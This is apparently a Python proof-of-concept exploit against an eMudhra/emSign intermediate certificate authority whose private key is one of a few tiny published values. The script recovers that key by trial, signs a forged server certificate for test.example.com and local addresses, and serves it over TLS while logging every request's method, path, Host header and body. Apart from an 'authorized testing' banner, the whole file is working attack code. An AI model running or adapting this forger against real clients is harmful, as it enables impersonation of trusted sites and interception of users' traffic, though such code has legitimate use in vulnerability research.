#!/usr/bin/env python3
"""eMudhra/emSign forged-cert server. WSL-only. FOR AUTHORIZED TESTING ONLY."""
import datetime, hashlib, ipaddress, ssl, sys
from pathlib import Path
from flask import Flask, request
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID

HERE = Path(__file__).resolve().parent
D_VALUES = [4, 56, 66, 115, 155, 156, 230, 237]
SANS = ["test.example.com", "localhost", "127.0.0.1", "::1"]

def spki(c):
    der = c.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
    return hashlib.sha256(der).hexdigest().upper()

def load(path):
    if not path.exists():
        sys.exit(f"[!] missing {path} — run ./fetch_chain.sh first")
    return x509.load_pem_x509_certificate(path.read_bytes())

def find_d(cert):
    t = cert.public_key().public_numbers()
    for d in D_VALUES:
        k = ec.derive_private_key(d, ec.SECP384R1())
        n = k.public_key().public_numbers()
        if n.x == t.x and n.y == t.y and n.curve.name == t.curve.name:
            return d, k
    sys.exit(f"[!] no published d matches {cert.subject.rfc4514_string()}\n"
             f"    SPKI {spki(cert)}")

def make_leaf(ic, key):
    lk = ec.generate_private_key(ec.SECP384R1())
    now = datetime.datetime.now(datetime.timezone.utc)
    entries = []
    for s in SANS:
        try: entries.append(x509.IPAddress(ipaddress.ip_address(s)))
        except ValueError: entries.append(x509.DNSName(s))
    return (x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "test.example.com")]))
            .issuer_name(ic.subject)
            .public_key(lk.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=30))
            .add_extension(x509.SubjectAlternativeName(entries), critical=False)
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(x509.KeyUsage(digital_signature=True, content_commitment=False,
                key_encipherment=True, data_encipherment=False, key_agreement=False,
                key_cert_sign=False, crl_sign=False, encipher_only=False, decipher_only=False),
                critical=True)
            .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(lk.public_key()), critical=False)
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ic.public_key()),
                critical=False)
            .sign(key, hashes.SHA384())), lk

def main():
    ic = load(HERE / "intermediate.pem")
    up = load(HERE / "chain2.pem") if (HERE / "chain2.pem").exists() else None
    d, key = find_d(ic)

    print("=" * 68)
    print(" eMudhra/emSign forged-cert server — FOR AUTHORIZED TESTING ONLY")
    print("=" * 68)
    print(f" intermediate : {ic.subject.rfc4514_string()}")
    print(f" SPKI         : {spki(ic)}")
    print(f" recovered d  : {d}")
    if up:
        print(f" chain2       : {up.subject.rfc4514_string()}")

    leaf, leaf_key = make_leaf(ic, key)
    with open(HERE / "chain.pem", "wb") as f:
        f.write(leaf.public_bytes(Encoding.PEM))
        f.write(ic.public_bytes(Encoding.PEM))
        if up: f.write(up.public_bytes(Encoding.PEM))
    with open(HERE / "leaf.key", "wb") as f:
        f.write(leaf_key.private_bytes(Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
    print(f" wrote        : chain.pem, leaf.key")

    app = Flask(__name__)
    @app.before_request
    def log():
        print(f"\n>>> {request.method} {request.full_path}  Host={request.headers.get('Host')}")
        if request.data:
            print(f"    body: {request.data[:1024]!r}")
    @app.route("/", defaults={"p": ""}, methods=["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"])
    @app.route("/<path:p>", methods=["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"])
    def ok(p): return f"OK {request.method} {request.path}\n", 200

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(str(HERE / "chain.pem"), str(HERE / "leaf.key"))
    print(f"\n[+] listening on https://0.0.0.0:8443/")
    print(f"[+] run test in another terminal:  python3 test_vulnerable.py\n")
    app.run(host="0.0.0.0", port=8443, ssl_context=ctx, debug=False)

if __name__ == "__main__":
    main()
